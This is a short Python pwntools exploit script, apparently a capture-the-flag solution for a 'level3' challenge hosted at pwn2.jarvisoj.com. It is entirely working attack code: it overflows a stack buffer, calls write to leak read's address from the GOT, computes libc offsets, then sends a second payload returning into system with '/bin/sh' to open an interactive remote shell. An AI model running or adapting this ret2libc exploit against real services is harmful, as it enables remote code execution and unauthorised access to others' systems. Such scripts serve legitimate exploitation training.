#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

write_addr = 0x08048340
read_got_addr = 0x0804A00C
vulner_addr = 0x0804844B

payload = "A" * (0x88 + 0x04)
payload += p32(write_addr)
payload += p32(vulner_addr)
payload += p32(0x01)		# stdout 1
payload += p32(read_got_addr)
payload += p32(0x04)

# Io = process('./level3')
Io = remote('pwn2.jarvisoj.com', 9879)
Io.recvuntil("Input:\n")
Io.send(payload)
tmp = Io.recv(4)
read_addr = u32(tmp[0:4])

read_libc_addr = 0x000daf60
offset = read_addr - read_libc_addr

system_addr = offset + 0x00040310
exit_addr = offset + 0x00033260
bin_sh_addr = offset + 0x16084c

payload = "A" * (0x88 + 0x04)
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(bin_sh_addr)

Io.sendline(payload)
Io.interactive()